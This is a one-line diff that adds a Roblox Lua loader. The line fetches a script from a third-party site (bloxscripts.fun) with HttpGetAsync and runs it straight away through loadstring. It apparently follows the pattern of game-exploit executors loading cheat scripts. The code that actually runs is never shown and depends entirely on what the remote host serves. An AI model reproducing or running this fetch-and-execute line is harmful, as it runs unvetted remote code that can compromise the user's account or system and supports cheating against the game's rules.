@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://bloxscripts.fun/scripts/8d42c31080.lua", true))()
